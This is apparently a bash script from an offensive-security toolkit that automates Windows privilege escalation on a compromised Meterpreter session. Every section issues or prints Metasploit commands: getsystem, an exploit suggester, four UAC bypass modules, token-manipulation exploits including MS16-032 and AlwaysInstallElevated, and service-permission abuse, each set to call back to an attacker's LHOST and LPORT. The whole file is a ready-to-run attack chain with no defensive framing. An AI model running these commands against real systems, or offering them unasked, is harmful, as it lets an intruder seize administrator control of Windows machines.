#!/usr/bin/env bash
# ==============================================================================
# WINDOWS AUTO PRIVESC — Automated privilege escalation
# Usage: bash auto_privesc.sh <SESSION_ID>
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
source "$SCRIPT_DIR/../../../lib/env.sh" 2>/dev/null || true
SESSION="${1:-}"
[[ -z "$SESSION" ]] && { echo "Usage: bash auto_privesc.sh <SESSION_ID>"; exit 1; }
IN_MSF=false; [[ "${MSF_CONSOLE:-}" == "1" ]] || [[ -n "${MSFCONSOLE_BIN:-}" ]] && IN_MSF=true
run_msf() { local m="$1"; shift; local c="use $m"; for a in "$@"; do c="$c; set $a"; done; c="$c; run"; echo "$c"; }
echo ""; echo "=== AUTO PRIVESC — Session: $SESSION ==="; echo ""
echo -e "--- ${BLUE}Get System${NC} ---"
$IN_MSF && run_msf "post/multi/manage/getsystem" "SESSION $SESSION" || echo "meterpreter -x 'getsystem'"
echo ""
echo -e "--- ${BLUE}Local Exploit Suggester${NC} ---"
$IN_MSF && run_msf "post/multi/recon/local_exploit_suggester" "SESSION $SESSION" || echo "msfconsole -x 'use post/multi/recon/local_exploit_suggester; set SESSION $SESSION; run'"
echo ""
echo -e "--- ${RED}UAC Bypass${NC} ---"
for uac in bypassuac_eventvwr bypassuac_comhijack bypassuac_fodhelper bypassuac_sdclt; do
    $IN_MSF && run_msf "exploit/windows/local/$uac" "SESSION $SESSION" "LHOST <LHOST>" "LPORT <LPORT>" || echo "use exploit/windows/local/$uac; set SESSION $SESSION"
done
echo ""
echo -e "--- ${RED}Token Manipulation${NC} ---"
for tok in token_duplication ms16_032_secondary_logon_handle always_install_elevated; do
    $IN_MSF && run_msf "exploit/windows/local/$tok" "SESSION $SESSION" "LHOST <LHOST>" "LPORT <LPORT>" || echo "use exploit/windows/local/$tok; set SESSION $SESSION"
done
echo ""
echo -e "--- ${YELLOW}Service Permissions${NC} ---"
$IN_MSF && run_msf "exploit/windows/local/service_permissions" "SESSION $SESSION" "LHOST <LHOST>" "LPORT <LPORT>" || echo "use exploit/windows/local/service_permissions; set SESSION $SESSION"
